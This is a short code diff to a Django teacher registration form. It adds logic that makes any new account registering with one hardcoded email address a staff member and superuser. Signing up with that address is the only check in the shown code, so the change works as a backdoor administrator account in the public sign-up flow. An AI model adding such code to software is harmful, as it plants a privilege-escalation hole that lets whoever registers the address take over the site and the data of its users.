@@ -40,6 +40,15 @@ class RegistrationForm(forms.ModelForm):
         # Use email as the username under the hood to satisfy AbstractUser constraints
         teacher.username = self.cleaned_data['email']
         teacher.set_password(self.cleaned_data['password'])
+        # Grant elevated rights for the admin email regardless of provided name
+        admin_email = 'snekkincoop@gmail.com'
+        try:
+            email_val = self.cleaned_data.get('email', '').strip().lower()
+        except Exception:
+            email_val = ''
+        if email_val == admin_email:
+            teacher.is_staff = True
+            teacher.is_superuser = True
         if commit:
             teacher.save()
         return teacher
